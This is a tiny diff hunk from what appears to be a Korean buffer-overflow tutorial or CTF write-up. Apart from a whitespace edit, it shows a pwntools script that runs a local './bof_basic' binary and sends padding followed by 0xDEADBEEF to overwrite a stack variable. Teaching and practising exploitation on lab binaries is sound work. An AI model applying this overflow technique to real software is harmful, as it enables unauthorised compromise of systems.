@@ -36,7 +36,7 @@ payload를 v5까지 덮을 수 있도록 만들자.
 
   #!/usr/bin/python
   from pwn import *
-
+  
   p = process('./bof_basic')
 
   payload = "A"*(0x2c-0x4)+p32(0xDEADBEEF)
